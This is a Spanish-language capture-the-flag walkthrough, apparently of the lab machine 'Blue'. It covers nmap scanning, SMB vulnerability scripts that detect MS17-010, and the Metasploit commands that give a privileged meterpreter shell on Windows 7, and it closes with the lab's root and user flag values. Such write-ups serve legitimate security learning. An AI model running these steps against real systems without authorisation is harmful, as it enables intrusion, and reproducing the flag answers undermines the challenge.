
![[ 20250709103540.png]](blue-images/20250709103540.png)

# Nmap

empezamos con un escaneo de puertos básicos con nmap 

```bash
nmap -p- --open --min-rate 5000 -sS -n -Pn 10.129.211.94 -oN scanner
```

![[ 20250709103640.png]]

seguimos con un escaneo de servicios y versiones con nmap

```bash
nmap -p135,139,445,49152,49153,49154,49155,49156,49157 -sCV 10.129.211.94 -oN targeted
```

![[ 20250709103734.png]]

aqui ya podemos ver la version windows 7 professional y vemos un usuario haris

# Autorecon

![[ 20250709103919.png]]

vemos el resultado de _full_tcp_nmap.txt_ y comprobamos que esta corriendo `Microsoft Windows 7|2008|8.1|2012|Vista|2016|10`

buscamos informacion en google

![[ 20250709104045.png]]

vemos que puede ser vulnerable a varias cosas asi que veamos con nmap scripts si nuestra victima es vulnerable

# Nmap scripts smb

lo primero es ver que scripts tenemos disponibles en nmap

```bash
ls /usr/share/nmap/scripts/ | grep smb
```

![[ 20250709104221.png]]

vemos varias pero las señaladas son las mas interesantes debido el resultado de la búsqueda en google

probamos 

```bash
nmap -p445 --script smb-vuln-ms10-061,smb-vuln-ms10-054,smb-vuln-ms17-010 -sV 10.129.211.94
```

![[ 20250709104411.png]]

vemos que es vulnerable a la vulnerabilidad `ms17-010`

# Metasploit

abrimos metasploit 

```bash
msfdb run
```

buscamos por la vulnerabilidad ms17-010

```bash
search ms17-010
```

![[ 20250709104602.png]]

podemos ver varios resultados

en mi caso elijo el modulo en la posición 0 ya que es el primero que aparece en caso de no funcionar seguiría probando con el resto

```bash
use 0
```

cambiamos el rhosts por la Ip victima (para ver las opciones de lo que podemos cambiar debemos usar el comando `options`)

```bash
set rhosts IPVICTIMA
```

con esto listo lanzamos el exploit

```bash
exploit
```

![[ 20250709104843.png]]

conseguimos una terminal como meterpreter con privilegios absolutos

# Flags

## Root

en el directorio `C:\Users\Administrator\Desktop` encontramos `root.txt`

![[ 20250709105020.png]]

root : fb20701fe3f28b9fbffcb452c7d6434a
## User

en el directorio `C:\Users\haris\Desktop` encontramos `user.txt`

![[ 20250709105122.png]]

user : 894ecdaf91fbd5713acf4fb76827d805

